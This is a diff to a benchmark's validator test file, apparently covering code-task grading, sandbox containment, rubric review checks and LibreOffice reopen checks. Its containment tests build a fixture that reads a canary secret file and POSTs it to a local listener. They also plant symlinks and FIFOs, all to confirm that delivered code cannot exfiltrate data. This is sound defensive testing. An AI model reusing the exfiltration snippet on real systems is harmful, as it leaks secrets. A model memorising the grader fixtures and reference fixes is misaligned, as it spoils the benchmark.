@@ -8,7 +8,9 @@
  */
 
 import assert from "node:assert/strict";
-import { cpSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { spawnSync } from "node:child_process";
+import { cpSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, renameSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { createServer } from "node:net";
 import { tmpdir } from "node:os";
 import path from "node:path";
 import { after, describe, it } from "node:test";
@@ -19,7 +21,8 @@ import PptxGenJS from "pptxgenjs";
 import { FIXTURES_DIR, HIDDEN_DIR, REPO_ROOT } from "../bench/workflows/lib/fixtures";
 import type { CheckResult, ValidatorSpec } from "../bench/workflows/lib/types";
 import { runValidator, type ValidationContext } from "../bench/workflows/lib/validators";
-import { validateCodeTests } from "../bench/workflows/lib/validators/code";
+import { CODE_TIMEOUT_MS, detectNetworkIsolation, validateCodeTests, type CodeContext } from "../bench/workflows/lib/validators/code";
+import { findSoffice } from "../bench/workflows/lib/validators/office";
 import { validateRubric } from "../bench/workflows/lib/validators/rubric";
 import { detectLanguage, meetingsViolations, rangeCovers } from "../bench/workflows/lib/validators/text";
 import { parseSse, textFromFrames } from "../bench/workflows/lib/validators/trace";
@@ -309,31 +312,168 @@ describe("citations", () => {
 });
 
 describe("code tests", () => {
-  function project(fix: (ledger: string) => string, weaken = false) {
+  // Fixture code is trusted, so where this machine has no network isolation
+  // the accept/reject tests may run it with filesystem limits only. The
+  // containment tests below never use that escape hatch.
+  const isolated = detectNetworkIsolation() !== null;
+  const codeCtx = (outputsDir: string, over: Partial<CodeContext> = {}): CodeContext => ({
+    outputsDir,
+    fixturesDir: FIXTURES_DIR,
+    hiddenDir: HIDDEN_DIR,
+    scratchDir: outputs(),
+    unsafeNoIsolation: !isolated,
+    ...over,
+  });
+  function project(fix: (ledger: string) => string, weaken = false, csv?: string) {
     const dir = outputs();
     cpSync(path.join(FIXTURES_DIR, "project"), path.join(dir, "project"), { recursive: true });
     const ledger = path.join(dir, "project/ledger.mjs");
     writeFileSync(ledger, fix(readFileSync(ledger, "utf8")));
+    if (csv !== undefined) writeFileSync(path.join(dir, "project/csv.mjs"), csv);
     if (weaken) writeFileSync(path.join(dir, "project/test.mjs"), "import test from 'node:test'; test('nothing', () => {});\n");
     return dir;
   }
-  const spec = { kind: "code_tests" as const, projectDir: "project", fixtureProject: "project", hiddenTests: "coding-01.hidden.test.mjs", protectedFiles: ["test.mjs"] };
+  const specFor = (n: 1 | 2 | 3) => ({ kind: "code_tests" as const, projectDir: "project", fixtureProject: "project", hiddenTests: `coding-0${n}.hidden.test.mjs`, protectedFiles: ["test.mjs"] });
+  const spec = specFor(1);
   const correct = (src: string) =>
     src.replace(
       /export function paidTotal\(rows\) \{[\s\S]*?\n\}/,
       "export function paidTotal(rows) {\n  const seen = new Set();\n  let cents = 0;\n  for (const row of rows) {\n    if (row.status !== 'paid' || seen.has(row.id)) continue;\n    seen.add(row.id);\n    cents += Math.round(Number(row.amount) * 100);\n  }\n  return cents / 100;\n}"
     );
+  const paginateFixed = (src: string) =>
+    src.replace(
+      /export function paginate\(rows, size\) \{[\s\S]*?\n\}/,
+      "export function paginate(rows, size) {\n  if (!Number.isInteger(size) || size <= 0) throw new RangeError('size must be a positive integer');\n  const pages = [];\n  for (let i = 0; i < rows.length; i += size) pages.push(rows.slice(i, i + size));\n  return pages;\n}"
+    );
+  const csvFixed = [
+    "export function parseCsvLine(line) {",
+    "  const out = [];",
+    "  let field = '';",
+    "  let quoted = false;",
+    "  for (let i = 0; i < line.length; i++) {",
+    "    const ch = line[i];",
+    "    if (quoted) {",
+    "      if (ch === '\"' && line[i + 1] === '\"') { field += '\"'; i++; }",
+    "      else if (ch === '\"') quoted = false;",
+    "      else field += ch;",
+    "    } else if (ch === '\"') quoted = true;",
+    "    else if (ch === ',') { out.push(field); field = ''; }",
+    "    else field += ch;",
+    "  }",
+    "  if (quoted) throw new SyntaxError('unterminated quote');",
+    "  out.push(field);",
+    "  return out;",
+    "}",
+    "",
+  ].join("\n");
 
-  it("a correct fix passes the held-out tests", () => {
-    const checks = validateCodeTests(spec, { outputsDir: project(correct), fixturesDir: FIXTURES_DIR, hiddenDir: HIDDEN_DIR, scratchDir: outputs() });
+  it("coding-01: a correct fix passes the held-out tests", () => {
+    const checks = validateCodeTests(spec, codeCtx(project(correct)));
     assert.ok(allPass(checks), JSON.stringify(checks));
   });
 
-  it("the unfixed fixture fails, and a weakened visible test is caught", () => {
-    const unfixed = validateCodeTests(spec, { outputsDir: project((s) => s), fixturesDir: FIXTURES_DIR, hiddenDir: HIDDEN_DIR, scratchDir: outputs() });
+  it("coding-01: the unfixed fixture fails, and a weakened visible test is caught", () => {
+    const unfixed = validateCodeTests(spec, codeCtx(project((s) => s)));
     assert.ok(failed(unfixed, ":tests"));
-    const weakened = validateCodeTests(spec, { outputsDir: project(correct, true), fixturesDir: FIXTURES_DIR, hiddenDir: HIDDEN_DIR, scratchDir: outputs() });
+    const weakened = validateCodeTests(spec, codeCtx(project(correct, true)));
     assert.ok(failed(weakened, "protected:test.mjs"));
+  });
+
+  it("coding-02: a correct fix passes; the unfixed loop is cut off by the heap cap well inside the timeout", () => {
+    const fixed = validateCodeTests(specFor(2), codeCtx(project(paginateFixed)));
+    assert.ok(allPass(fixed), JSON.stringify(fixed));
+    assert.match(fixed.find((c) => c.id.endsWith(":tests"))!.detail, /^6\/6 /);
+    const t0 = Date.now();
+    const unfixed = validateCodeTests(specFor(2), codeCtx(project((s) => s)));
+    assert.ok(failed(unfixed, ":tests"), JSON.stringify(unfixed));
+    assert.ok(Date.now() - t0 < CODE_TIMEOUT_MS + 5_000, `took ${Date.now() - t0} ms`);
+  });
+
+  it("coding-03: a correct parser passes; the unimplemented fixture fails", () => {
+    const fixed = validateCodeTests(specFor(3), codeCtx(project((s) => s, false, csvFixed)));
+    assert.ok(allPass(fixed), JSON.stringify(fixed));
+    assert.match(fixed.find((c) => c.id.endsWith(":tests"))!.detail, /^7\/7 /);
+    const unfixed = validateCodeTests(specFor(3), codeCtx(project((s) => s)));
+    assert.ok(failed(unfixed, ":tests"));
+    assert.match(unfixed.find((c) => c.id.endsWith(":tests"))!.detail, /^5\/7 failing/);
+  });
+
+  // ── Containment: delivered code is untrusted ───────────────────────────────
+  async function listener() {
+    const seen: string[] = [];
+    const server = createServer((socket) => {
+      seen.push("connection");
+      socket.on("data", (chunk) => seen.push(chunk.toString("utf8")));
+      socket.on("error", () => {});
+    });
+    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
+    const port = (server.address() as { port: number }).port;
+    // spawnSync blocks this event loop; whatever reached the socket is read after it returns.
+    const drain = async () => {
+      await new Promise((resolve) => setTimeout(resolve, 400));
+      await new Promise<void>((resolve) => server.close(() => resolve()));
+      return seen.join("");
+    };
+    return { port, drain };
+  }
+  function canary() {
+    const dir = outputs();
+    const file = path.join(dir, "outside-secret.txt");
+    writeFileSync(file, "TOP-SECRET-CANARY-123");
+    return file;
+  }
+  /** Delivered code that reads `target` and POSTs it to the listener, then the correct fix. */
+  const exfiltrating = (target: string, port: number) => (src: string) =>
+    `import { readFileSync as __read } from "node:fs";\n` +
+    `let __loot = "nothing";\n` +
+    `try { __loot = __read(${JSON.stringify(target)}, "utf8"); } catch (e) { __loot = "denied:" + e.code; }\n` +
+    `try { await fetch("http://127.0.0.1:${port}/x", { method: "POST", body: __loot, signal: AbortSignal.timeout(2000) }); } catch {}\n` +
+    correct(src);
+
+  it("a symlink in the delivered project is refused before anything is read or run, and nothing leaves", { skip: isolated ? false : "needs unshare -rn" }, async () => {
+    const secret = canary();
+    const { port, drain } = await listener();
+    const dir = project(exfiltrating("./leak.txt", port));
+    // The relative read above resolves against the test's cwd (the scratch copy).
+    symlinkSync(secret, path.join(dir, "project/leak.txt"));
+    const checks = validateCodeTests(spec, codeCtx(dir, { unsafeNoIsolation: false }));
+    const links = checks.find((c) => c.id === "code:project:links");
+    assert.equal(links?.status, "fail");
+    assert.match(links!.detail, /symlink in delivered project/);
+    assert.match(links!.detail, /leak\.txt/);
+    assert.ok(!checks.some((c) => c.id.endsWith(":tests")), "the code must not have been executed");
+    assert.equal(await drain(), "", "no egress");
+  });
+
+  it("the project directory itself being a link, or a FIFO inside it, is refused without hanging", () => {
+    const dir = project(correct);
+    renameSync(path.join(dir, "project"), path.join(dir, "real"));
+    symlinkSync(path.join(dir, "real"), path.join(dir, "project"));
+    assert.match(validateCodeTests(spec, codeCtx(dir)).find((c) => c.status === "fail")!.detail, /symlink in delivered project/);
+    const fifoDir = project(correct);
+    const mk = spawnSync("mkfifo", [path.join(fifoDir, "project/test.mjs.pipe")]);
+    if (mk.status === 0) assert.ok(failed(validateCodeTests(spec, codeCtx(fifoDir)), ":links"));
+  });
+
+  it("delivered code runs with no network: a direct read is denied and a POST to a host listener never arrives", { skip: isolated ? false : "needs unshare -rn" }, async () => {
+    const secret = canary();
+    const { port, drain } = await listener();
+    const checks = validateCodeTests(spec, codeCtx(project(exfiltrating(secret, port)), { unsafeNoIsolation: false }));
+    const tests = checks.find((c) => c.id.endsWith(":tests"));
+    assert.equal(tests?.status, "pass", JSON.stringify(checks));
+    assert.match(tests!.detail, /network-isolated/);
+    assert.equal(await drain(), "", "no egress");
+  });
+
+  it("without network isolation the code is not executed (not_run), unless --unsafe-code", async () => {
+    const { port, drain } = await listener();
+    const checks = validateCodeTests(spec, codeCtx(project(exfiltrating("/nonexistent", port)), { isolation: null, unsafeNoIsolation: false }));
+    const tests = checks.find((c) => c.id.endsWith(":tests"));
+    assert.equal(tests?.status, "not_run");
+    assert.match(tests!.detail, /not executed.*unshare -rn.*--unsafe-code/);
+    assert.equal(await drain(), "", "nothing ran, so nothing was sent");
+    const unsafe = validateCodeTests(spec, codeCtx(project(correct), { isolation: null, unsafeNoIsolation: true }));
+    assert.match(unsafe.find((c) => c.id.endsWith(":tests"))!.detail, /UNSAFE: network NOT isolated/);
   });
 });
 
@@ -459,6 +599,16 @@ describe("rubric", () => {
     assert.ok(failed(validateRubric(spec, review, [{ ...artifacts[0], sha256: "changed" }], "executor-a"), "hashes"));
     assert.ok(failed(validateRubric(spec, { ...review, scores: { correct: 3 } }, artifacts, "executor-a"), "rubric:correct"));
   });
+  it("rejects the review-template placeholders and a reviewedAt that is not a date", () => {
+    // Exactly what `review-template` prints, left unfilled.
+    const template = { ...review, reviewer: "<your name — must not be the executor>", reviewedAt: "<ISO date-time of your review, e.g. 2026-10-25T14:00:00Z>" };
+    const checks = validateRubric(spec, template, artifacts, "executor-a");
+    assert.ok(failed(checks, "rubric:reviewer"));
+    assert.ok(failed(checks, "rubric:reviewed-at"));
+    for (const reviewer of ["your name", "TBD", "n/a", "<name>"]) assert.ok(failed(validateRubric(spec, { ...review, reviewer }, artifacts, "executor-a"), "rubric:reviewer"), reviewer);
+    for (const reviewedAt of ["yesterday", "2026-13-01", "2026-02-30", ""]) assert.ok(failed(validateRubric(spec, { ...review, reviewedAt }, artifacts, "executor-a"), "reviewed-at"), reviewedAt);
+    assert.ok(allPass(validateRubric(spec, { ...review, reviewedAt: "2026-10-25" }, artifacts, "executor-a")));
+  });
 });
 
 describe("one_of and office reopen", () => {
@@ -477,5 +627,61 @@ describe("one_of and office reopen", () => {
     writeFileSync(path.join(dir, "memo.docx"), "x");
     assert.deepEqual(statuses(await run({ kind: "office_reopen", file: "memo.docx", format: "docx" }, dir, { officeReopen: true, soffice: null })), ["not_run"]);
     assert.deepEqual(statuses(await run({ kind: "office_reopen", file: "memo.docx", format: "docx" }, dir, { officeReopen: false, soffice: "/usr/bin/soffice" })), ["not_run"]);
+  });
+});
+
+describe("office reopen with LibreOffice", () => {
+  const soffice = findSoffice();
+  const skip = soffice ? false : "LibreOffice (soffice) is not installed here";
+  const reopen = (spec: ValidatorSpec, dir: string) => run(spec, dir, { officeReopen: true, soffice });
+  const docx = () =>
+    Packer.toBuffer(new Document({ sections: [{ children: [new Paragraph({ text: "Decision", heading: HeadingLevel.HEADING_1 }), new Paragraph("Maya owns the EUR 2,400 follow-up.")] }] }));
+  async function book(cached: number) {
+    const wb = new ExcelJS.Workbook();
+    const ws = wb.addWorksheet("S");
+    ws.addRow(["a", 100]);
+    ws.addRow(["b", 200]);
+    ws.getCell("B3").value = { formula: "B1+B2", result: cached };
+    return Buffer.from(await wb.xlsx.writeBuffer());
+  }
+  async function deck() {
+    const pptx = new PptxGenJS();
+    pptx.layout = "LAYOUT_16x9";
+    pptx.addSlide().addText("Maya owns the follow-up", { x: 0.5, y: 0.5, w: 9, h: 1, fontSize: 24 });
+    return Buffer.from((await pptx.write({ outputType: "nodebuffer" })) as ArrayBuffer);
+  }
+
+  it("docx: a real document renders; a text file named .docx does not reopen", { skip }, async () => {
+    const dir = outputs();
+    writeFileSync(path.join(dir, "memo.docx"), await docx());
+    const good = await reopen({ kind: "office_reopen", file: "memo.docx", format: "docx", pages: { max: 2 } }, dir);
+    assert.ok(allPass(good), JSON.stringify(good));
+    // Without an explicit import filter LibreOffice falls back to a text import and "renders" this.
+    writeFileSync(path.join(dir, "fake.docx"), "PK not really a docx\nMaya owns the follow-up.\n");
+    const fake = await reopen({ kind: "office_reopen", file: "fake.docx", format: "docx", pages: { max: 2 } }, dir);
+    assert.deepEqual(statuses(fake), ["fail"], JSON.stringify(fake));
+    assert.match(fake[0].detail, /MS Word 2007 XML/);
+  });
+
+  it("pptx: a real deck renders; a text file named .pptx does not reopen", { skip }, async () => {
+    const dir = outputs();
+    writeFileSync(path.join(dir, "d.pptx"), await deck());
+    const good = await reopen({ kind: "office_reopen", file: "d.pptx", format: "pptx", pages: { min: 1, max: 1 } }, dir);
+    assert.ok(allPass(good), JSON.stringify(good));
+    writeFileSync(path.join(dir, "fake.pptx"), "Slide 1: Maya owns the follow-up\n");
+    assert.deepEqual(statuses(await reopen({ kind: "office_reopen", file: "fake.pptx", format: "pptx" }, dir)), ["fail"]);
+  });
+
+  it("xlsx: an honest cache passes, a stale cached total fails, a CSV named .xlsx does not reopen", { skip }, async () => {
+    const dir = outputs();
+    writeFileSync(path.join(dir, "honest.xlsx"), await book(300));
+    writeFileSync(path.join(dir, "stale.xlsx"), await book(999));
+    writeFileSync(path.join(dir, "fake.xlsx"), "a,100\nb,200\ntotal,300\n");
+    const honest = await reopen({ kind: "office_reopen", file: "honest.xlsx", format: "xlsx", recalcValues: [300] }, dir);
+    assert.ok(allPass(honest), JSON.stringify(honest));
+    const stale = await reopen({ kind: "office_reopen", file: "stale.xlsx", format: "xlsx", recalcValues: [300] }, dir);
+    assert.ok(failed(stale, "no-stale-cache"), JSON.stringify(stale));
+    assert.match(stale.find((c) => c.id.endsWith("no-stale-cache"))!.detail, /cached 999 but computes 300/);
+    assert.deepEqual(statuses(await reopen({ kind: "office_reopen", file: "fake.xlsx", format: "xlsx", recalcValues: [300] }, dir)), ["fail"]);
   });
 });
